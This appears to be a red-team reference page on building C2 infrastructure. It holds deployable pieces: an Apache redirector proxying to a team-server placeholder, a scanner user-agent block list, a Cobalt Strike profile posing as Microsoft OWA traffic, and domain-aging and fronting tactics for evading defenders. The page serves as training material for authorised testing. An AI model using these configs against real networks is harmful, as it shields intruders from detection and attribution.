# C2 Infrastructure Design

> **MITRE ATT&CK**: Command and Control > T1090 - Proxy
> **Platforms**: Cloud infrastructure (AWS, Azure, DigitalOcean, etc.)
> **Required Privileges**: Infrastructure admin (attacker's own infrastructure)
> **OPSEC Risk**: Critical (infrastructure mistakes burn entire engagements)

## Strategic Overview

C2 infrastructure design is the most under-appreciated skill in red teaming. A perfectly crafted payload is worthless if the C2 infrastructure is traced back to the operator, blocked by network defenders, or taken down mid-engagement. The fundamental principle is **defense in depth for attackers**: multiple layers of separation between the operator and the target, with each layer being independently replaceable. If defenders identify and block a redirector, you swap it out without touching the team server or losing established sessions.

**Infrastructure tiers**: Operator workstation -> Team server (never internet-exposed) -> Redirector(s) (expendable, internet-facing) -> Target network. The team server IP should never appear in any target's logs.

## Technical Deep-Dive

### Multi-Tier Architecture

```
[Operator] --> [Team Server] --> [Redirector 1] --> [Target Network]
                              \-> [Redirector 2] --> [Target Network]
                              \-> [DNS Redirector] -> [Target Network]

Team Server:   Private IP only, accessible via VPN/SSH tunnel
Redirectors:   Public IP, categorized domain, HTTPS certificate
               Filter traffic: only forward valid C2 traffic, block scanners
```

### Redirector Setup (Apache mod_rewrite)

```apache
# /etc/apache2/sites-enabled/redirector.conf
# Only forward requests matching C2 profile URIs to team server
# Block everything else (scanners, incident responders)

<VirtualHost *:443>
    ServerName legitimate-site.com
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/legitimate-site.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/legitimate-site.com/privkey.pem

    RewriteEngine On

    # Block known security scanner User-Agents
    RewriteCond %{HTTP_USER_AGENT} .*(curl|wget|python|scanner|nikto).* [NC]
    RewriteRule ^(.*)$ https://www.microsoft.com/ [L,R=302]

    # Only forward URIs matching C2 profile
    RewriteCond %{REQUEST_URI} ^/api/v1/updates [OR]
    RewriteCond %{REQUEST_URI} ^/api/v1/status [OR]
    RewriteCond %{REQUEST_URI} ^/content/docs/.*\.js$
    RewriteRule ^(.*)$ https://TEAM_SERVER_IP%{REQUEST_URI} [P,L]

    # Everything else redirects to legitimate site
    RewriteRule ^(.*)$ https://www.microsoft.com/ [L,R=302]
</VirtualHost>
```

### Redirector Setup (Nginx)

```nginx
# Same concept as Apache: proxy_pass C2 URIs to team server, return 302 for everything else
# Block scanner User-Agents, forward /api/v1/ to TEAM_SERVER_IP, default -> microsoft.com
```

### Cloud Function Redirectors (Serverless)

```python
# AWS Lambda redirector -- harder to block (IP belongs to AWS)
# Lambda receives request via API Gateway, forwards to team server, returns response
# Deploy behind API Gateway with custom domain
# Traffic appears to come from AWS API Gateway IPs -- extremely hard to block

# Azure Functions and GCP Cloud Functions work identically
# Key advantage: IP ranges belong to cloud provider, shared with millions of legit services
```

### Domain Fronting and Alternatives

```
# Classic domain fronting: Outer TLS SNI = allowed-cdn-domain.com, Inner Host = attacker C2
# CDN routes based on Host header; firewall sees only allowed domain

# Current alternatives (2024+):
# 1. CloudFlare Workers -- route C2 through CF edge (Worker fetches from team server)
# 2. AWS CloudFront with Lambda@Edge or custom origin
# 3. Azure CDN with custom domains (limited configurations)
# 4. Fastly -- custom VCL configurations
```

### Malleable C2 Profiles (Cobalt Strike)

```
# Profile mimicking Microsoft 365 traffic
set sleeptime "60000";
set jitter    "37";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
set host_stage "false";    # Disable staging (OPSEC critical)

https-certificate {
    set C   "US";
    set ST  "Washington";
    set O   "Microsoft Corporation";
    set CN  "outlook.office365.com";
    # Or use valid Let's Encrypt cert with keystore
    set keystore "c2.store";
    set password "password";
}

http-get {
    set uri "/owa/service.svc";
    client {
        header "Accept" "application/json";
        header "X-OWA-UrlPostData" "%s";
        metadata { base64url; header "Cookie"; }
    }
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "X-OWA-Version" "15.1.2507.6";
        output { base64; print; }
    }
}

http-post {
    set uri "/owa/service.svc/s/GetConversationItems";
    client { header "Content-Type" "application/json"; id { base64url; header "X-OWA-CANARY"; } output { base64; print; } }
    server { output { base64; print; } }
}

# Process injection: use NtMapViewOfSection allocator, userwx=false, startrwx=false
```

### Infrastructure as Code (Terraform + Ansible)

```bash
# Terraform for rapid deployment: redirectors (public), team server (VPC-only)
# terraform apply -> 2 redirectors + 1 team server in < 5 minutes
# Ansible for post-deployment: install Apache, configure mod_rewrite, deploy certs
# ansible-playbook -i inventory c2-setup.yml
# Key benefit: Entire infrastructure is reproducible, version-controlled, and teardown is instant
```

### HTTPS Certificates and Domain Categorization

```bash
# Let's Encrypt for valid certificates
certbot certonly --standalone -d c2.legitimate-domain.com

# Domain categorization -- get domain categorized before engagement
# Register domain 2-4 weeks early, host legitimate content
# Check categorization: Bluecoat, McAfee, Fortiguard, Palo Alto URL Filtering
# Target categories: Business, Technology, CDN, Cloud Services

# Expired/auctioned domains -- buy domains with existing categorization and reputation
# ExpiredDomains.net -- search for recently dropped domains with good category
```

## Detection & Evasion

| Infrastructure Component | Detection Method | Evasion |
|------------------------|-----------------|---------|
| Team server IP in logs | Netflow, firewall logs | Always use redirectors, never expose TS |
| Uncategorized domain | Proxy/firewall URL category block | Pre-categorize domains weeks before engagement |
| New/young domain | Domain age filtering | Use aged domains or expired domain auctions |
| Self-signed certificate | TLS inspection, cert transparency | Valid Let's Encrypt or purchased certificate |
| Default C2 profile | Network IDS signatures | Custom Malleable C2 profile, unique URIs |
| Cloud function IPs | IP reputation lookups | Rotate functions, use multiple regions |

**Critical OPSEC rules**:
1. Team server must NEVER be directly internet-accessible
2. Each engagement gets unique infrastructure -- never reuse between clients
3. Categorize domains 2+ weeks before the engagement start date
4. Test your Malleable C2 profile against the target's proxy/IDS before go-live
5. Have backup redirectors ready for instant swap if one gets burned
6. Keep infrastructure deployment automated for rapid rebuild

## Cross-References

- [C2 Frameworks](./c2-frameworks.md)
- [DNS C2](./dns-c2.md)
- [Covert Channels](./covert-channels.md)
- [Lab Infrastructure](../00-methodology/lab-infrastructure.md)

## References

- MITRE ATT&CK T1090: https://attack.mitre.org/techniques/T1090/
- Red Team Infrastructure Wiki: https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
- Malleable C2 Profiles: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm
- Cobalt Strike C2 Profile Collection: https://github.com/threatexpress/malleable-c2
- Domain Fronting: https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/
